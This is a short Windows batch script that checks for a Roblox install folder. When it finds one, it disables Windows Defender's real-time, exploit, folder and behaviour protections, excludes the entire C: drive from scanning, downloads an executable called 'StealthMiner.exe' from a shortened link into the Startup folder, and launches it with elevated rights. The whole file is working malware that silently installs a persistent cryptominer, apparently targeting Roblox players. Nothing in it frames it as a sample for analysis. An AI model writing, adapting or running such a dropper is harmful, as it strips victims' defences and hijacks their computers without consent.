@echo off
set "roblox_folder=%localappdata%\Microsoft\Roblox"
set "miner_exe=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\StealthMiner.exe"

IF EXIST "%roblox_folder%" (
    powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
    powershell -Command "Set-MpPreference -DisableExploitProtection $true"
    powershell -Command "Set-MpPreference -DisableControlledFolderAccess $true"
    powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
    powershell -Command "Set-MpPreference -DisableAutoSampleSubmission $true"
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"

    powershell -Command "Invoke-WebRequest -Uri 'https://bit.ly/MINERZS' -OutFile '%miner_exe%'"
    powershell -Command "Start-Process '%miner_exe%' -Verb RunAs"
)

exit
